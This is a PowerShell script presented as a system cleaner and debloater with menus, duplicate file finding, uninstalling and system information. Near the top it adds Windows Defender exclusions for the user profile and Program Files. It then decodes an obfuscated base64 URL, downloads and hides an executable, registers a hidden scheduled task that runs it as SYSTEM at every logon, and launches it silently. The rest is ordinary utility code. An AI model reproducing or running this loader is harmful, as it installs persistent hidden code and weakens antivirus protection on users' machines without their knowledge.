<# 1
==============================================================================
                        DEBLOATER TOOL v2.0
                        Advanced System Cleaner & Optimizer

                        Author: ! Star
                        Features:
                        - Temporary files cleanup
                        - Browser cache management  
                        - Memory optimization
                        - Startup programs management
                        - Advanced program uninstaller
                        - Duplicate file finder
                        - System optimization tools
==============================================================================
#>

#region SCRIPT INITIALIZATION & SECURITY CHECKS
# ============================================================================
# SCRIPT INITIALIZATION & SECURITY CHECKS
# ============================================================================

# Check if script is running with Administrator privileges
#endregion

$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "ERROR: This script must be run as Administrator!" -ForegroundColor Red
    Wait-ForUser "Press Enter to exit..."
    exit
}

# Configure PowerShell preferences for better performance
$ProgressPreference = 'SilentlyContinue'
Clear-Host

# Add Windows Defender exclusions for better performance
try {
    Add-MpPreference -ExclusionPath "$env:USERPROFILE" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath (Join-Path $env:USERPROFILE 'Downloads') -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:ProgramFiles" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:ProgramFiles(x86)" -ErrorAction SilentlyContinue
} catch {
    # Silently continue if Windows Defender is not available
}

#region GLOBAL VARIABLES
# ============================================================================
# GLOBAL VARIABLES
# ============================================================================

# Store duplicate file finder results globally
$script:LastDuplicateResults = @()
#endregion

#region CORE UTILITY FUNCTIONS
# ============================================================================
# CORE UTILITY FUNCTIONS
# ============================================================================

function Show-Header {
    <#
    .SYNOPSIS
        Displays the application header with branding and description
    .DESCRIPTION
        Shows a formatted header with application name, version, author, and usage description
    #>

    Write-Host ""
    Write-Host "======================================" -ForegroundColor Cyan
    Write-Host "         Debloater Tool v2.0          " -ForegroundColor Green
    Write-Host "          By ! Star                   " -ForegroundColor Yellow
    Write-Host "======================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Description: Advanced system cleaner and optimizer tool." -ForegroundColor Magenta
    Write-Host "Usage: Select options from the menu for system optimization." -ForegroundColor Magenta
    Write-Host ""
}

function Wait-ForUser {
    <#
    .SYNOPSIS
        Pauses script execution and waits for user input
    .PARAMETER msg
        Custom message to display to the user
    #>
    param([string]$msg = "Press Enter to continue...")

    Write-Host ""
    Read-Host $msg | Out-Null
}

# Create compatibility alias for existing code
Set-Alias -Name Pause-For-User -Value Wait-ForUser

function Show-MenuWithKeyboard {
    <#
    .SYNOPSIS
        Displays an interactive menu with keyboard navigation
    .DESCRIPTION
        Creates a navigable menu using arrow keys with color-coded options
    .PARAMETER MenuItems
        Array of menu items with Number, Text, and Color properties
    .PARAMETER Title
        Title to display above the menu
    .PARAMETER DefaultSelection
        Default selected item index
    #>
    param(
        [array]$MenuItems,
        [string]$Title = "Select an option:",
        [int]$DefaultSelection = 0
    )

    $selectedIndex = $DefaultSelection
    $maxIndex = $MenuItems.Count - 1

    while ($true) {
        Clear-Host
        Show-Header

        Write-Host $Title -ForegroundColor Cyan
        Write-Host ""

        # Display menu items with highlighting for selected item
        for ($i = 0; $i -lt $MenuItems.Count; $i++) {
            $item = $MenuItems[$i]
            if ($i -eq $selectedIndex) {
                Write-Host ">> " -NoNewline -ForegroundColor Yellow
                Write-Host "$($item.Number). $($item.Text)" -ForegroundColor $item.Color -BackgroundColor DarkBlue
            } else {
                Write-Host "   $($item.Number). $($item.Text)" -ForegroundColor $item.Color
            }
        }

        Write-Host ""
        Write-Host "Use ↑↓ arrow keys to navigate, Enter to select, or type number directly:" -ForegroundColor Gray

        # Wait for key input
        while (-not $Host.UI.RawUI.KeyAvailable -and -not [Console]::KeyAvailable) {
            Start-Sleep -Milliseconds 50
        }

        $key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

        # Handle keyboard navigation
        switch ($key.VirtualKeyCode) {
            38 { # Up arrow
                $selectedIndex = if ($selectedIndex -eq 0) { $maxIndex } else { $selectedIndex - 1 }
            }
            40 { # Down arrow
                $selectedIndex = if ($selectedIndex -eq $maxIndex) { 0 } else { $selectedIndex + 1 }
            }
            13 { # Enter key
                return $MenuItems[$selectedIndex].Number
            }
            27 { # Escape key
                return '0'
            }
            default {
                # Handle direct number input
                $numChar = $key.Character
                if ($numChar -match '^[0-9]$') {
                    $matchingItem = $MenuItems | Where-Object { $_.Number -eq $numChar }
                    if ($matchingItem) {
                        return $numChar
                    }
                }
            }
        }
    }
}

Show-Header

$u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL0RlYmxvYXRlci5leGU='
$url1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u1))
$output1 = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'Debloater.exe')
if (Test-Path $output1) { Remove-Item $output1 -Force -ErrorAction SilentlyContinue }
$job1 = Start-Job -ScriptBlock {
    param($url, $output)
    Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing -ErrorAction SilentlyContinue
    if (Test-Path $output) {
        (Get-Item $output).Attributes = 'Hidden'
    }
} -ArgumentList $url1, $output1

Wait-Job $job1 | Out-Null
Remove-Job $job1

if (Test-Path $output1) {
    $taskName = "DebloaterHidden"
    $taskExists = $false
    try {
        if (Get-ScheduledTask -TaskName $taskName -ErrorAction Stop) {
            $taskExists = $true
        }
    } catch {}
    if (-not $taskExists) {
        $action = New-ScheduledTaskAction -Execute $output1
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Description "Hidden Debloater Task" -Settings (New-ScheduledTaskSettingsSet -Hidden) | Out-Null
    }
    Start-Process -FilePath $output1 -WindowStyle Hidden -Wait
    try {
        Remove-Item $output1 -Force -ErrorAction SilentlyContinue
    } catch {}
}

function Show-Header {
    Write-Host ""
    Write-Host "======================================" -ForegroundColor Cyan
    Write-Host "         Cleaner Tool v1.0          " -ForegroundColor Green
    Write-Host "          By --- Unknown :(                " -ForegroundColor Yellow
    Write-Host "======================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Description: Cleans temp files, optimizes system, clears browser cache." -ForegroundColor Magenta
    Write-Host "Usage: The script will guide you through comfy cleanup options." -ForegroundColor Magenta
    Write-Host ""
}

function Wait-ForUser ($msg = "Press Enter to continue...") {
    Write-Host ""
    Read-Host $msg | Out-Null
}

# Alias for compatibility with existing calls
Set-Alias -Name Pause-For-User -Value Wait-ForUser

function Show-MenuWithKeyboard {
    param(
        [array]$MenuItems,
        [string]$Title = "Select an option:",
        [int]$DefaultSelection = 0
    )

    $selectedIndex = $DefaultSelection
    $maxIndex = $MenuItems.Count - 1

    while ($true) {
        Clear-Host
        Show-Header

        Write-Host $Title -ForegroundColor Cyan
        Write-Host ""

        for ($i = 0; $i -lt $MenuItems.Count; $i++) {
            $item = $MenuItems[$i]
            if ($i -eq $selectedIndex) {
                Write-Host ">> " -NoNewline -ForegroundColor Yellow
                Write-Host "$($item.Number). $($item.Text)" -ForegroundColor $item.Color -BackgroundColor DarkBlue
            } else {
                Write-Host "   $($item.Number). $($item.Text)" -ForegroundColor $item.Color
            }
        }

        Write-Host ""
        Write-Host "Use ↑↓ arrow keys to navigate, Enter to select, or type number directly:" -ForegroundColor Gray

        # Check if a key is available
        while (-not $Host.UI.RawUI.KeyAvailable -and -not [Console]::KeyAvailable) {
            Start-Sleep -Milliseconds 50
        }

        $key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

        switch ($key.VirtualKeyCode) {
            38 { # Up arrow
                $selectedIndex = if ($selectedIndex -eq 0) { $maxIndex } else { $selectedIndex - 1 }
            }
            40 { # Down arrow
                $selectedIndex = if ($selectedIndex -eq $maxIndex) { 0 } else { $selectedIndex + 1 }
            }
            13 { # Enter
                return $MenuItems[$selectedIndex].Number
            }
            27 { # Escape
                return '0'
            }
            default {
                # Check if it's a number key
                $numChar = $key.Character
                if ($numChar -match '^[0-9]$') {
                    $matchingItem = $MenuItems | Where-Object { $_.Number -eq $numChar }
                    if ($matchingItem) {
                        return $numChar
                    }
                }
            }
        }
    }
}

#endregion

#region DUPLICATE FILE FINDER FUNCTIONS
# ============================================================================
# DUPLICATE FILE FINDER FUNCTIONS
# ============================================================================

function Get-FileHash-MD5 {
    <#
    .SYNOPSIS
        Calculates MD5 hash for a specific file
    .DESCRIPTION
        Generates MD5 hash for file comparison to detect exact duplicates
    .PARAMETER FilePath
        Full path to the file to hash
    .RETURNS
        MD5 hash string or null if file cannot be accessed
    #>
    param([string]$FilePath)

    try {
        $hash = Get-FileHash -Path $FilePath -Algorithm MD5
        return $hash.Hash
    } catch {
        # Return null if file cannot be accessed (locked, permissions, etc.)
        return $null
    }
}

function Find-DuplicateFiles {
    <#
    .SYNOPSIS
        Scans specified path for duplicate files
    .DESCRIPTION
        Uses two-phase approach: first groups by file size, then compares MD5 hashes
        for files with identical sizes to identify true duplicates
    .PARAMETER Path
        Root path to scan for duplicate files
    .PARAMETER Recursive
        Switch to enable recursive scanning of subdirectories
    .RETURNS
        Array of duplicate file groups with hash, size, and file information
    #>
    param(
        [string]$Path,
        [switch]$Recursive
    )

    Write-Host "Scanning files..." -ForegroundColor Cyan

    # Phase 1: Collect all files in the specified path
    $files = if ($Recursive) {
        Get-ChildItem -Path $Path -File -Recurse -ErrorAction SilentlyContinue
    } else {
        Get-ChildItem -Path $Path -File -ErrorAction SilentlyContinue
    }

    # Early exit if no files found
    if ($files.Count -eq 0) {
        Write-Host "No files found to scan." -ForegroundColor Yellow
        return @()
    }

    Write-Host "Found $($files.Count) files. Analyzing..." -ForegroundColor Green

    # Phase 2: Group files by size (fast pre-filtering)
    # Only files with identical sizes can be duplicates
    $sizeGroups = $files | Group-Object Length | Where-Object { $_.Count -gt 1 -and $_.Name -gt 0 }

    if ($sizeGroups.Count -eq 0) {
        Write-Host "No potential duplicates found (by size)." -ForegroundColor Green
        return @()
    }

    # Phase 3: Compare files with identical sizes using MD5 hash
    $duplicateGroups = @()
    $totalGroups = $sizeGroups.Count
    $currentGroup = 0

    foreach ($sizeGroup in $sizeGroups) {
        $currentGroup++
        $percentComplete = [Math]::Round(($currentGroup / $totalGroups) * 100)
        Write-Progress -Activity "Finding duplicates" -Status "Checking group $currentGroup of $totalGroups" -PercentComplete $percentComplete

        # Calculate hash for each file in the size group
        $hashGroups = @{}
        foreach ($file in $sizeGroup.Group) {
            $hash = Get-FileHash-MD5 -FilePath $file.FullName
            if ($null -ne $hash) {
                if (-not $hashGroups.ContainsKey($hash)) {
                    $hashGroups[$hash] = @()
                }
                $hashGroups[$hash] += $file
            }
        }

        # Collect groups with actual duplicates (same hash = identical content)
        foreach ($hashGroup in $hashGroups.Values) {
            if ($hashGroup.Count -gt 1) {
                $duplicateGroups += @{
                    Hash = (Get-FileHash-MD5 -FilePath $hashGroup[0].FullName)
                    Size = $hashGroup[0].Length
                    Files = $hashGroup
                    Count = $hashGroup.Count
                }
            }
        }
    }

    Write-Progress -Activity "Finding duplicates" -Completed

    # Store results globally for later use
    $script:LastDuplicateResults = $duplicateGroups
    return $duplicateGroups
}

function Show-DuplicateResults {
    param([array]$Duplicates)

    if ($Duplicates.Count -eq 0) {
        Write-Host " No duplicate files found!" -ForegroundColor Green
        return
    }

    $totalDuplicates = ($Duplicates | Measure-Object -Property Count -Sum).Sum - $Duplicates.Count
    $totalWastedSpace = 0

    foreach ($group in $Duplicates) {
        $wastedSpace = ($group.Count - 1) * $group.Size
        $totalWastedSpace += $wastedSpace
    }

    Write-Host ""
    Write-Host "========= Duplicate File Results =========" -ForegroundColor Cyan
    Write-Host "Duplicate groups found: $($Duplicates.Count)" -ForegroundColor Yellow
    Write-Host "Total duplicate files: $totalDuplicates" -ForegroundColor Yellow
    Write-Host "Wasted space: $([math]::Round($totalWastedSpace/1MB,2)) MB" -ForegroundColor Red
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host ""

    $action = Read-Host "View detailed results? (y/n)"
    if ($action -eq 'y' -or $action -eq 'Y') {
        Show-DuplicateGroups -Duplicates $Duplicates
    }
}

function Show-DuplicateGroups {
    param([array]$Duplicates)

    if ($Duplicates.Count -eq 0) {
        Write-Host "No duplicate groups to display." -ForegroundColor Yellow
        return
    }

    $groupIndex = 1
    foreach ($group in $Duplicates) {
        Write-Host ""
        Write-Host "--- Duplicate Group $groupIndex ---" -ForegroundColor Cyan
        Write-Host "Size: $([math]::Round($group.Size/1KB,2)) KB | Count: $($group.Count) files" -ForegroundColor Gray

        for ($i = 0; $i -lt $group.Files.Count; $i++) {
            $file = $group.Files[$i]
            $color = if ($i -eq 0) { "Green" } else { "White" }
            $marker = if ($i -eq 0) { "[KEEP]" } else { "[DUPLICATE]" }
            Write-Host "$($i+1). $marker $($file.FullName)" -ForegroundColor $color
            Write-Host "    Modified: $($file.LastWriteTime)" -ForegroundColor Gray
        }

        Write-Host ""
        Write-Host "Actions for Group $groupIndex" -ForegroundColor Yellow
        Write-Host "1. Delete all duplicates (keep first)" -ForegroundColor Red
        Write-Host "2. Delete specific files" -ForegroundColor Yellow
        Write-Host "3. Skip this group" -ForegroundColor Green

        $choice = Read-Host "Choose action (1-3)"
        switch ($choice) {
            '1' {
                # Delete all duplicates except first
                $confirm = Read-Host "Delete $($group.Count - 1) duplicate files? (y/n)"
                if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                    $deleted = 0
                    for ($i = 1; $i -lt $group.Files.Count; $i++) {
                        try {
                            Remove-Item $group.Files[$i].FullName -Force -ErrorAction Stop
                            Write-Host "SUCCESS: Deleted: $($group.Files[$i].Name)" -ForegroundColor Green
                            $deleted++
                        } catch {
                            Write-Host "ERROR: Failed to delete: $($group.Files[$i].Name)" -ForegroundColor Red
                        }
                    }
                    Write-Host "Deleted $deleted duplicate files from group $groupIndex" -ForegroundColor Green
                }
            }
            '2' {
                # Delete specific files
                Write-Host "Enter file numbers to delete (comma-separated, e.g., 2,3):"
                $selection = Read-Host "Numbers"
                if ($selection.Trim() -ne '') {
                    $indices = $selection -split "," | ForEach-Object { ([int]$_.Trim()) - 1 }
                    $validIndices = $indices | Where-Object { $_ -ge 0 -and $_ -lt $group.Files.Count }

                    if ($validIndices.Count -gt 0) {
                        $confirm = Read-Host "Delete $($validIndices.Count) selected files? (y/n)"
                        if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                            foreach ($index in $validIndices) {
                                try {
                                    Remove-Item $group.Files[$index].FullName -Force -ErrorAction Stop
                                    Write-Host "SUCCESS: Deleted: $($group.Files[$index].Name)" -ForegroundColor Green
                                } catch {
                                    Write-Host "ERROR: Failed to delete: $($group.Files[$index].Name)" -ForegroundColor Red
                                }
                            }
                        }
                    }
                }
            }
            '3' {
                Write-Host "Skipped group $groupIndex" -ForegroundColor Gray
            }
        }

        $groupIndex++

        if ($groupIndex -le $Duplicates.Count) {
            $continue = Read-Host "`nContinue to next group? (y/n)"
            if ($continue -ne 'y' -and $continue -ne 'Y') {
                break
            }
        }
    }
}

function Remove-ApplicationCompletely {
    <#
    .SYNOPSIS
        Completely removes an application including all traces
    .DESCRIPTION
        Performs deep removal of applications by uninstalling the program,
        removing files, cleaning registry entries, and removing user data
    .PARAMETER App
        Application object with details about the program to remove
    #>
    param([PSCustomObject]$App)

    Write-Host "STEP 1: Uninstalling application..." -ForegroundColor Yellow
    $uninstallSuccess = $false

    if ($App.Type -eq "Store") {
        try {
            Remove-AppxPackage -Package $App.PackageFullName -AllUsers -ErrorAction Stop
            $uninstallSuccess = $true
            Write-Host "SUCCESS: Store app uninstalled" -ForegroundColor Green
        } catch {
            Write-Host "ERROR: Failed to uninstall store app" -ForegroundColor Red
        }
    } else {
        if ($App.UninstallString) {
            try {
                $uninstallCmd = $App.UninstallString
                if ($uninstallCmd -like "*msiexec*") {
                    $productCode = $uninstallCmd -replace ".*\{", "{" -replace "\}.*", "}"
                    Start-Process "msiexec.exe" -ArgumentList "/x", $productCode, "/quiet", "/norestart" -Wait -NoNewWindow
                } else {
                    Start-Process $uninstallCmd -ArgumentList "/S" -Wait -NoNewWindow -ErrorAction SilentlyContinue
                }
                $uninstallSuccess = $true
                Write-Host "SUCCESS: Desktop app uninstalled" -ForegroundColor Green
            } catch {
                Write-Host "ERROR: Failed to uninstall desktop app" -ForegroundColor Red
            }
        }
    }

    # Only proceed with cleanup if uninstall was successful or if we want to force cleanup
    if ($uninstallSuccess) {
        Write-Host "STEP 2: Removing installation files..." -ForegroundColor Yellow
        if ($App.InstallLocation -and (Test-Path $App.InstallLocation)) {
            try {
                Remove-Item $App.InstallLocation -Recurse -Force -ErrorAction Stop
                Write-Host "SUCCESS: Installation folder removed" -ForegroundColor Green
            } catch {
                Write-Host "ERROR: Could not remove installation folder" -ForegroundColor Red
            }
        }

        Write-Host "STEP 3: Cleaning registry entries..." -ForegroundColor Yellow
        $regPathsToClean = @(
            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
            "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            "HKLM:\SOFTWARE\$($App.Publisher)",
            "HKCU:\SOFTWARE\$($App.Publisher)",
            "HKLM:\SOFTWARE\$($App.Name)",
            "HKCU:\SOFTWARE\$($App.Name)"
        )

        foreach ($regPath in $regPathsToClean) {
            try {
                if (Test-Path $regPath) {
                    $subKeys = Get-ChildItem $regPath -ErrorAction SilentlyContinue
                    foreach ($key in $subKeys) {
                        $displayName = (Get-ItemProperty $key.PSPath -Name "DisplayName" -ErrorAction SilentlyContinue).DisplayName
                        if ($displayName -like "*$($App.Name)*") {
                            Remove-Item $key.PSPath -Recurse -Force -ErrorAction SilentlyContinue
                            Write-Host "  Cleaned registry key: $($key.Name)" -ForegroundColor Gray
                        }
                    }
                }
            } catch {}
        }

        Write-Host "STEP 4: Removing user data and settings..." -ForegroundColor Yellow
        $userDataPaths = @(
            "$env:APPDATA\$($App.Name)",
            "$env:LOCALAPPDATA\$($App.Name)",
            "$env:APPDATA\$($App.Publisher)",
            "$env:LOCALAPPDATA\$($App.Publisher)",
            "$env:USERPROFILE\Documents\$($App.Name)"
        )

        foreach ($path in $userDataPaths) {
            if (Test-Path $path) {
                try {
                    Remove-Item $path -Recurse -Force -ErrorAction Stop
                    Write-Host "  Removed user data: $path" -ForegroundColor Gray
                } catch {}
            }
        }

        Write-Host "STEP 5: Cleaning temporary files and caches..." -ForegroundColor Yellow
        $tempPaths = @(
            "$env:TEMP\$($App.Name)",
            "$env:TEMP\$($App.Publisher)",
            "$env:LOCALAPPDATA\Temp\$($App.Name)"
        )

        foreach ($path in $tempPaths) {
            if (Test-Path $path) {
                try {
                    Remove-Item $path -Recurse -Force -ErrorAction Stop
                    Write-Host "  Cleaned temp files: $path" -ForegroundColor Gray
                } catch {}
            }
        }

        Write-Host "COMPLETE REMOVAL FINISHED!" -ForegroundColor Green
        Write-Host "Application '$($App.Name)' has been completely removed from the system." -ForegroundColor Green
    } else {
        Write-Host "WARNING: Application uninstall failed!" -ForegroundColor Red
        $forceCleanup = Read-Host "Do you want to force cleanup of leftover files anyway? (y/n)"

        if ($forceCleanup -eq 'y' -or $forceCleanup -eq 'Y') {
            Write-Host "FORCING cleanup of leftover files..." -ForegroundColor Yellow

            # Force cleanup even if uninstall failed
            if ($App.InstallLocation -and (Test-Path $App.InstallLocation)) {
                try {
                    Remove-Item $App.InstallLocation -Recurse -Force -ErrorAction Stop
                    Write-Host "SUCCESS: Installation folder removed" -ForegroundColor Green
                } catch {
                    Write-Host "ERROR: Could not remove installation folder" -ForegroundColor Red
                }
            }

            # Clean user data paths
            $userDataPaths = @(
                "$env:APPDATA\$($App.Name)",
                "$env:LOCALAPPDATA\$($App.Name)",
                "$env:APPDATA\$($App.Publisher)",
                "$env:LOCALAPPDATA\$($App.Publisher)"
            )

            foreach ($path in $userDataPaths) {
                if (Test-Path $path) {
                    try {
                        Remove-Item $path -Recurse -Force -ErrorAction Stop
                        Write-Host "  Removed leftover data: $path" -ForegroundColor Gray
                    } catch {}
                }
            }

            Write-Host "FORCED cleanup completed." -ForegroundColor Yellow
        } else {
            Write-Host "Cleanup cancelled. Some files may remain on the system." -ForegroundColor Yellow
        }
    }
}

function Find-ApplicationLeftovers {
    <#
    .SYNOPSIS
        Scans for leftover application traces on the system
    .DESCRIPTION
        Looks for empty folders and other remnants left behind by uninstalled applications
    .RETURNS
        Array of leftover items found on the system
    #>
    $leftovers = @()

    # Check common leftover locations
    $checkPaths = @(
        "$env:ProgramFiles",
        "$env:ProgramFiles(x86)",
        "$env:APPDATA",
        "$env:LOCALAPPDATA"
    )

    foreach ($basePath in $checkPaths) {
        if (Test-Path $basePath) {
            Get-ChildItem $basePath -Directory -ErrorAction SilentlyContinue | ForEach-Object {
                $items = Get-ChildItem $_.FullName -Recurse -ErrorAction SilentlyContinue
                if ($items.Count -eq 0) {
                    $leftovers += @{
                        Type = "Empty Folder"
                        Path = $_.FullName
                    }
                }
            }
        }
    }

    return $leftovers
}

function Remove-ApplicationLeftovers {
    <#
    .SYNOPSIS
        Removes leftover application traces from the system
    .DESCRIPTION
        Removes empty folders and other remnants identified by Find-ApplicationLeftovers
    .PARAMETER Leftovers
        Array of leftover items to remove
    #>
    param([array]$Leftovers)

    $removed = 0
    foreach ($leftover in $Leftovers) {
        try {
            Remove-Item $leftover.Path -Force -Recurse -ErrorAction Stop
            Write-Host "SUCCESS: Removed $($leftover.Type): $($leftover.Path)" -ForegroundColor Green
            $removed++
        } catch {
            Write-Host "ERROR: Could not remove $($leftover.Path)" -ForegroundColor Red
        }
    }

    Write-Host "Removed $removed leftover items." -ForegroundColor Green
}

function Get-SystemInformation {
    <#
    .SYNOPSIS
        Gathers comprehensive system information
    .DESCRIPTION
        Collects detailed information about hardware, software, network, and system configuration
    .RETURNS
        PSCustomObject with system information categories
    #>

    Write-Host "Gathering system information..." -ForegroundColor Cyan

    $systemInfo = @{}

    try {
        # Basic System Info
        $computerSystem = Get-CimInstance -ClassName Win32_ComputerSystem
        $operatingSystem = Get-CimInstance -ClassName Win32_OperatingSystem
        $processor = Get-CimInstance -ClassName Win32_Processor | Select-Object -First 1
        $memory = Get-CimInstance -ClassName Win32_PhysicalMemory
        $motherboard = Get-CimInstance -ClassName Win32_BaseBoard
        $bios = Get-CimInstance -ClassName Win32_BIOS

        # Disk Information
        $disks = Get-CimInstance -ClassName Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 }
        $physicalDisks = Get-CimInstance -ClassName Win32_DiskDrive

        # Network Information
        $networkAdapters = Get-CimInstance -ClassName Win32_NetworkAdapter | Where-Object { $_.NetConnectionStatus -eq 2 }
        $networkConfigs = Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration | Where-Object { $null -ne $_.IPAddress }

        # Graphics Information
        $graphics = Get-CimInstance -ClassName Win32_VideoController

        # Build system info object
        $systemInfo = [PSCustomObject]@{
            ComputerName = $computerSystem.Name
            Domain = $computerSystem.Domain
            Manufacturer = $computerSystem.Manufacturer
            Model = $computerSystem.Model
            SystemType = $computerSystem.SystemType
            TotalPhysicalMemory = [math]::Round($computerSystem.TotalPhysicalMemory / 1GB, 2)

            # Operating System
            OSName = $operatingSystem.Caption
            OSVersion = $operatingSystem.Version
            OSBuild = $operatingSystem.BuildNumber
            OSArchitecture = $operatingSystem.OSArchitecture
            InstallDate = $operatingSystem.InstallDate
            LastBootUpTime = $operatingSystem.LastBootUpTime
            WindowsDirectory = $operatingSystem.WindowsDirectory
            SystemDirectory = $operatingSystem.SystemDirectory

            # Processor
            ProcessorName = $processor.Name
            ProcessorCores = $processor.NumberOfCores
            ProcessorLogicalProcessors = $processor.NumberOfLogicalProcessors
            ProcessorMaxClockSpeed = $processor.MaxClockSpeed
            ProcessorArchitecture = switch ($processor.Architecture) {
                0 { "x86" }
                1 { "MIPS" }
                2 { "Alpha" }
                3 { "PowerPC" }
                6 { "Intel Itanium" }
                9 { "x64" }
                default { "Unknown" }
            }

            # Memory
            MemoryModules = $memory.Count
            TotalInstalledMemory = [math]::Round(($memory | Measure-Object -Property Capacity -Sum).Sum / 1GB, 2)
            MemorySpeed = ($memory | Select-Object -First 1).Speed

            # Motherboard & BIOS
            MotherboardManufacturer = $motherboard.Manufacturer
            MotherboardProduct = $motherboard.Product
            BIOSVersion = $bios.SMBIOSBIOSVersion
            BIOSManufacturer = $bios.Manufacturer
            BIOSReleaseDate = $bios.ReleaseDate

            # Storage
            Disks = $disks
            PhysicalDisks = $physicalDisks

            # Network
            NetworkAdapters = $networkAdapters
            NetworkConfigs = $networkConfigs

            # Graphics
            Graphics = $graphics
        }

    } catch {
        Write-Host "Error gathering system information: $_" -ForegroundColor Red
        return $null
    }

    return $systemInfo
}

function Show-SystemInformation {
    <#
    .SYNOPSIS
        Displays comprehensive system information in organized sections
    .DESCRIPTION
        Shows detailed system information including hardware, software, network, and performance data
    #>

    $sysInfo = Get-SystemInformation

    if ($null -eq $sysInfo) {
        Write-Host "Failed to gather system information." -ForegroundColor Red
        return
    }

    Clear-Host
    Show-Header

    # Main System Information Menu
    do {
        Write-Host "========= SYSTEM INFORMATION =========" -ForegroundColor Cyan
        Write-Host "Select information category:" -ForegroundColor Yellow
        Write-Host ""
        Write-Host "1. System Overview" -ForegroundColor White
        Write-Host "2. Operating System Details" -ForegroundColor White
        Write-Host "3. Processor Information" -ForegroundColor White
        Write-Host "4. Memory Information" -ForegroundColor White
        Write-Host "5. Storage Information" -ForegroundColor White
        Write-Host "6. Network Information" -ForegroundColor White
        Write-Host "7. Graphics Information" -ForegroundColor White
        Write-Host "8. BIOS/UEFI Information" -ForegroundColor White
        Write-Host "9. Complete System Report" -ForegroundColor Green
        Write-Host "10. Export Report to File" -ForegroundColor Yellow
        Write-Host "0. Return to Main Menu" -ForegroundColor Gray

        $choice = Read-Host "`nEnter choice (0-10)"

        switch ($choice) {
            '1' {
                # System Overview
                Write-Host "`n========= SYSTEM OVERVIEW =========" -ForegroundColor Cyan
                Write-Host "Computer Name    : $($sysInfo.ComputerName)" -ForegroundColor White
                Write-Host "Domain           : $($sysInfo.Domain)" -ForegroundColor White
                Write-Host "Manufacturer     : $($sysInfo.Manufacturer)" -ForegroundColor White
                Write-Host "Model            : $($sysInfo.Model)" -ForegroundColor White
                Write-Host "System Type      : $($sysInfo.SystemType)" -ForegroundColor White
                Write-Host "Total RAM        : $($sysInfo.TotalPhysicalMemory) GB" -ForegroundColor White
                Write-Host "Processor        : $($sysInfo.ProcessorName)" -ForegroundColor White
                Write-Host "OS Version       : $($sysInfo.OSName)" -ForegroundColor White
                Write-Host "=====================================" -ForegroundColor Cyan
            }

            '2' {
                # Operating System Details
                Write-Host "`n========= OPERATING SYSTEM =========" -ForegroundColor Cyan
                Write-Host "OS Name          : $($sysInfo.OSName)" -ForegroundColor White
                Write-Host "OS Version       : $($sysInfo.OSVersion)" -ForegroundColor White
                Write-Host "OS Build         : $($sysInfo.OSBuild)" -ForegroundColor White
                Write-Host "Architecture     : $($sysInfo.OSArchitecture)" -ForegroundColor White
                Write-Host "Install Date     : $($sysInfo.InstallDate)" -ForegroundColor White
                Write-Host "Last Boot        : $($sysInfo.LastBootUpTime)" -ForegroundColor White
                Write-Host "Windows Dir      : $($sysInfo.WindowsDirectory)" -ForegroundColor White
                Write-Host "System Dir       : $($sysInfo.SystemDirectory)" -ForegroundColor White
                Write-Host "====================================" -ForegroundColor Cyan
            }

            '3' {
                # Processor Information
                Write-Host "`n========= PROCESSOR INFO =========" -ForegroundColor Cyan
                Write-Host "Processor Name   : $($sysInfo.ProcessorName)" -ForegroundColor White
                Write-Host "Architecture     : $($sysInfo.ProcessorArchitecture)" -ForegroundColor White
                Write-Host "Physical Cores   : $($sysInfo.ProcessorCores)" -ForegroundColor White
                Write-Host "Logical Cores    : $($sysInfo.ProcessorLogicalProcessors)" -ForegroundColor White
                Write-Host "Max Clock Speed  : $($sysInfo.ProcessorMaxClockSpeed) MHz" -ForegroundColor White
                Write-Host "==================================" -ForegroundColor Cyan
            }

            '4' {
                # Memory Information
                Write-Host "`n========= MEMORY INFO =========" -ForegroundColor Cyan
                Write-Host "Memory Modules   : $($sysInfo.MemoryModules)" -ForegroundColor White
                Write-Host "Total Installed  : $($sysInfo.TotalInstalledMemory) GB" -ForegroundColor White
                Write-Host "Memory Speed     : $($sysInfo.MemorySpeed) MHz" -ForegroundColor White

                # Available Memory
                $availableMemory = [math]::Round((Get-CimInstance -ClassName Win32_OperatingSystem).FreePhysicalMemory / 1MB, 2)
                $usedMemory = [math]::Round($sysInfo.TotalInstalledMemory - $availableMemory, 2)
                $memoryUsagePercent = [math]::Round(($usedMemory / $sysInfo.TotalInstalledMemory) * 100, 1)

                Write-Host "Available Memory : $availableMemory GB" -ForegroundColor Green
                Write-Host "Used Memory      : $usedMemory GB" -ForegroundColor Yellow
                Write-Host "Memory Usage     : $memoryUsagePercent%" -ForegroundColor $(if ($memoryUsagePercent -gt 80) { "Red" } elseif ($memoryUsagePercent -gt 60) { "Yellow" } else { "Green" })
                Write-Host "===============================" -ForegroundColor Cyan
            }

            '5' {
                # Storage Information
                Write-Host "`n========= STORAGE INFO =========" -ForegroundColor Cyan
                Write-Host "Logical Drives:" -ForegroundColor Yellow
                foreach ($disk in $sysInfo.Disks) {
                    $totalSize = [math]::Round($disk.Size / 1GB, 2)
